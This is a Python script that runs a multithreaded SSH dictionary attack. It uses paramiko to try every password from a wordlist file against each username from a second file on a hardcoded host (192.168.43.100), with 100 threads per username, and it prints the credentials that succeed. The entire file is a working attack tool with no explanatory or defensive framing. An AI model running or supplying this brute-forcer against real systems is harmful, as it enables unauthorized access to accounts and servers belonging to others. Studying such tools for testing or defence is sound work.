import threading
import paramiko
from threading import Thread
import queue
import time
import socket

class SSH_Multithread():
    
    #Initializing
    def __init__(self):
        self.host_ip = "192.168.43.100"
        self.password_list=[]
        self.username_list=[]
        self.correct_password = None
        self.correct_username = None
        self.passwords=queue.LifoQueue() #Passwords queue
        self.usernames=queue.LifoQueue() #Usernames queue
        self.threads = 100 #number of threads

    #Fill the usernames & passwords into list, then put into queue
    def read_usernames_passwords(self):
        print('Reading username and password files...')
        try:
            with open("100pass.txt") as all_passwords:
                self.password_list = all_passwords.readlines()
                self.password_list = [p.strip() for p in self.password_list]    

            with open("usernames.txt") as all_usernames:
                self.username_list = all_usernames.readlines()
                self.username_list = [u.strip() for u in self.username_list]   

        except IOError:
            print("File not found")

    def fill_usernames(self):
        for user in self.username_list:
            self.usernames.put(user)

    def fill_passwords(self):
        #fill in passwords
        for password in self.password_list:
            self.passwords.put(password)

    def do_brute_force(self):
        #read in files
        self.read_usernames_passwords()
        self.fill_usernames()

        #for each username, test 100 passwords on it
        while not self.usernames.empty():
                self.do_single_username(self.usernames.get())
    
    #For each username, do the following
    def do_single_username(self, username):
        thread_list = [] 
        self.fill_passwords()
        for i in range(1,self.threads+1):
            thread = Thread(target=self.do_ssh, args=(username,)) #use comma to make tuple for args
            thread.start()
            thread_list.append(thread)

        for thread in thread_list:
            thread.join()

    def do_ssh(self, username):
        if self.correct_password:
            exit(0)
        else:
            while not self.passwords.empty():
                current_pass = self.passwords.get()

                try:
                    ssh_client = paramiko.client.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(hostname=self.host_ip, username=username,password=current_pass)
                
                    print('Success! [' + username + ":" + current_pass + "]")
                    self.correct_password = current_pass
                    self.correct_username = username
                    exit(0)
        
                except paramiko.AuthenticationException: #for wrong password
                    print('Failed [' + username + ":" + current_pass+"]")
                except Exception: #any other exceptions
                    print('Error: username: %s, password: %s' %(username, current_pass))
                finally:
                    self.passwords.task_done()
                    ssh_client.close()
                    print(threading.active_count())
                
#Main method
if __name__ == '__main__':
    start = time.time()
    dictionary_ssh = SSH_Multithread()
    dictionary_ssh.do_brute_force()
    end = time.time()
    if not dictionary_ssh.correct_password:
        print('Attack unsuccessful')
    else:
        print('Dictionary attack succeeded with [%s:%s]' %(dictionary_ssh.correct_username, \
            dictionary_ssh.correct_password))
    print("\n")
    print("-"*20)
    print (end - start)
    print ("-"*20)
